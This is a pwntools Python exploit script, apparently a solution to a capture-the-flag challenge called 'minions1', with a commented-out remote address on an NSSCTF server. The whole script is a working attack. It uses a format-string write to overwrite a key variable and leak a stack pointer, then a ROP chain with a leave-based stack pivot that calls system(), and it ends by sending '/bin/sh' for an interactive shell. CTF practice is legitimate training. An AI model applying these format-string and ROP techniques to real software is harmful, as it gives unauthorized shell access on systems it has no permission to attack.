from pwn import *

io = process("./minions1")
#io = remote("node5.anna.nssctf.cn", 29705)
elf = ELF("./minions1")
context.log_level = "debug"

rdi_addr = 0x400893
ret_addr = 0x400581
key_addr = 0x6010A0  # dd 4 字节
leave = 0x400758
hdctf = 0x6010C0

system_plt = elf.plt["system"]

# offset = 6
payload0 = f"%32$p%{102 - 14}c%8$naaa".encode() + p64(key_addr)
io.recvuntil(b"name?")
io.sendline(payload0)

io.recvuntil(b"0x")
rdp = int(io.recvuntil(b" ")[:-1], 16)
print("rdp = ", hex(rdp))
new_rdp = rdp - 0x30

# ---------------------------------


payload1 = p64(0) + p64(ret_addr) + p64(rdi_addr) + p64(hdctf) + p64(system_plt)
payload1 = payload1.ljust(0x30, b"\x00")
payload1 += p64(new_rdp)
payload1 += p64(leave)

io.recvuntil(b"you")
io.send(payload1)

# ---------------------------------

io.recvuntil(b"Minions?")
payload2 = b"/bin/sh\x00"
io.sendline(payload2)
io.interactive()
